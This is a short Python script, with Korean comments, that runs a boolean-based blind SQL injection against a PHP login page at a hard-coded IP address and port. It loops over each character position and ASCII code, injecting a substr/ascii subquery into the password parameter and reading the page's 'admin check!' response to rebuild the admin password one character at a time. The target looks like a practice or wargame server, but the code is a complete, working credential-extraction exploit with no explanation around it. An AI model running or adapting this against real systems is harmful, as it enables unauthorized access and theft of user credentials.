import requests

def extract_password():
    password = ''
    # password의 각 문자의 ASCII 값을 확인합니다.
    for position in range(1, 16):  # 패스워드 길이를 1부터 15까지 가정
        for ascii_code in range(33, 128):  # 출력 가능한 아스키 코드 범위
            url = "http://13.209.81.224:6060/index.php?id=admin&password=123' or ascii(substr((select password from users where id='admin'),{0},1))={1} -- -".format(position, ascii_code)
            res = requests.get(url)
            if "admin check!" in res.text:
                password += chr(ascii_code)
                print("Position {0}: Character {1} with ASCII {2}".format(position, chr(ascii_code), ascii_code))
    print(password)

# 메인 함수 실행
extract_password()